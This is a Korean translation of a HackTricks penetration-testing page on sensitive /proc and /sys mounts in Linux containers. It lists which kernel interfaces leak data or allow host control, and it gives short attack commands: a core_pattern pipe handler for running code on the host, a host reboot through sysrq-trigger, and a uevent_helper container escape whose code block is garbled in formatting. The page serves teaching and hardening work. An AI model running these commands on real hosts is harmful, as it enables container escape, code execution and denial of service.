# 민감한 마운트

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 요령을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 제출하세요.

</details>

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

`/proc` 및 `/sys`의 노출은 적절한 네임스페이스 격리 없이는 공격 표면 확대 및 정보 노출과 같은 중요한 보안 위험을 초래할 수 있습니다. 이러한 디렉토리에는 민감한 파일이 포함되어 있으며, 잘못 구성되거나 무단으로 액세스되면 컨테이너 탈출, 호스트 수정 또는 추가 공격을 돕는 정보 제공이 가능합니다. 예를 들어, `-v /proc:/host/proc`를 잘못 마운트하면 경로 기반의 특성으로 인해 AppArmor 보호를 우회할 수 있어 `/host/proc`가 보호되지 않게 됩니다.

**각 잠재적인 취약점에 대한 자세한 내용은** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**에서 찾을 수 있습니다.**

## procfs 취약점

### `/proc/sys`

이 디렉토리는 일반적으로 `sysctl(2)`를 통해 커널 변수를 수정할 수 있도록 허용하며, 다음과 같은 하위 디렉토리가 포함되어 있습니다:

#### **`/proc/sys/kernel/core_pattern`**

* [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)에 설명되어 있음.
* 첫 128바이트를 인수로 사용하여 코어 파일 생성 시 실행할 프로그램을 정의할 수 있습니다. 파일이 `|`로 시작하면 코드 실행으로 이어질 수 있습니다.
*   **테스트 및 악용 예시**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 쓰기 액세스 테스트
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # 사용자 지정 핸들러 설정
sleep 5 && ./crash & # 핸들러 트리거
```

#### **`/proc/sys/kernel/modprobe`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 자세히 기술되어 있음.
* 커널 모듈 로더의 경로를 포함하며, 커널 모듈을 로드하기 위해 호출됩니다.
*   **액세스 확인 예시**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobe에 대한 액세스 확인
```

#### **`/proc/sys/vm/panic_on_oom`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 언급되어 있음.
* OOM 조건이 발생할 때 커널이 패닉 또는 OOM 킬러를 호출하는 전역 플래그입니다.

#### **`/proc/sys/fs`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 따르면 파일 시스템에 대한 옵션 및 정보가 포함되어 있습니다.
* 쓰기 액세스는 호스트에 대한 다양한 서비스 거부 공격을 활성화할 수 있습니다.

#### **`/proc/sys/fs/binfmt_misc`**

* 매직 넘버에 따라 비네이티브 바이너리 형식의 해석기를 등록할 수 있습니다.
* `/proc/sys/fs/binfmt_misc/register`가 쓰기 가능하면 권한 상승 또는 루트 쉘 액세스로 이어질 수 있습니다.
* 관련 악용 및 설명:
* [binfmt\_misc를 통한 Poor man's rootkit](https://github.com/toffan/binfmt\_misc)
* 깊이 있는 자습서: [비디오 링크](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc`의 기타 항목

#### **`/proc/config.gz`**

* `CONFIG_IKCONFIG_PROC`가 활성화된 경우 커널 구성을 노출할 수 있습니다.
* 실행 중인 커널의 취약점을 식별하는 데 유용합니다.

#### **`/proc/sysrq-trigger`**

* Sysrq 명령을 호출할 수 있어 즉시 시스템 재부팅이나 기타 중요한 작업을 유발할 수 있습니다.
*   **호스트 재부팅 예시**:

```bash
echo b > /proc/sysrq-trigger # 호스트 재부팅
```

#### **`/proc/kmsg`**

* 커널 링 버퍼 메시지를 노출합니다.
* 커널 악용, 주소 누출 및 민감한 시스템 정보 제공에 도움이 될 수 있습니다.

#### **`/proc/kallsyms`**

* 커널 내보낸 심볼과 그 주소를 나열합니다.
* 특히 KASLR을 극복하기 위해 커널 악용 개발에 필수적입니다.
* 주소 정보는 `kptr_restrict`가 `1` 또는 `2`로 설정된 경우에 제한됩니다.
* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 자세한 내용이 있습니다.

#### **`/proc/[pid]/mem`**

* 커널 메모리 장치 `/dev/mem`과 상호 작용합니다.
* 역사적으로 권한 상승 공격에 취약했습니다.
* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 자세한 내용을 확인할 수 있습니다.

#### **`/proc/kcore`**

* ELF 코어 형식으로 시스템의 물리적 메모리를 나타냅니다.
* 읽기는 호스트 시스템 및 다른 컨테이너의 메모리 내용을 노출할 수 있습니다.
* 큰 파일 크기는 읽기 문제나 소프트웨어 충돌로 이어질 수 있습니다.
* [2019년 /proc/kcore 덤프](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)에서 자세한 사용법을 확인할 수 있습니다.

#### **`/proc/kmem`**

* 커널 가상 메모리를 나타내는 `/dev/kmem`의 대체 인터페이스입니다.
* 읽기 및 쓰기를 허용하므로 커널 메모리를 직접 수정할 수 있습니다.

#### **`/proc/mem`**

* 물리적 메모리를 나타내는 `/dev/mem`의 대체 인터페이스입니다.
* 모든 메모리의 읽기 및 쓰기를 허용하며, 모든 메모리 수정에는 가상 주소를 물리 주소로 변환해야 합니다.

#### **`/proc/sched_debug`**

* PID 네임스페이스 보호를 우회하여 프로세스 스케줄링 정보를 반환합니다.
* 프로세스 이름, ID 및 cgroup 식별자를 노출합니다.

#### **`/proc/[pid]/mountinfo`**

* 프로세스의 마운트 네임스페이스에 대한 마운트 지점 정보를 제공합니다.
* 컨테이너 `rootfs` 또는 이미지의 위치를 노출합니다.

### `/sys` 취약점

#### **`/sys/kernel/uevent_helper`**

* 커널 장치 `uevents`를 처리하는 데 사용됩니다.
* `/sys/kernel/uevent_helper`에 쓰기하면 `uevent` 트리거 시 임의의 스크립트를 실행할 수 있습니다.
*   **악용 예시**: %%%bash

#### 페이로드 생성

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### 컨테이너용 OverlayFS 마운트에서 호스트 경로 찾기

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### 악의적인 헬퍼로 uevent\_helper 설정

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### uevent 트리거

echo change > /sys/class/mem/null/uevent

#### 출력 읽기

cat /output %%%
#### **`/sys/class/thermal`**

* 온도 설정을 제어하여 DoS 공격이나 물리적 손상을 유발할 수 있습니다.

#### **`/sys/kernel/vmcoreinfo`**

* 커널 주소를 노출하여 KASLR을 compromise할 수 있습니다.

#### **`/sys/kernel/security`**

* `securityfs` 인터페이스를 포함하며, AppArmor와 같은 Linux Security Modules의 구성을 허용합니다.
* 액세스 권한을 통해 컨테이너가 MAC 시스템을 비활성화할 수 있습니다.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

* NVRAM의 EFI 변수와 상호 작용하기 위한 인터페이스를 노출합니다.
* 잘못된 구성 또는 악용으로 인해 브릭된 노트북이나 부팅할 수 없는 호스트 머신으로 이어질 수 있습니다.

#### **`/sys/kernel/debug`**

* `debugfs`는 커널에 대한 "규칙 없는" 디버깅 인터페이스를 제공합니다.
* 제한이 없는 성격으로 인한 보안 문제의 역사가 있습니다.

### 참고 자료

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
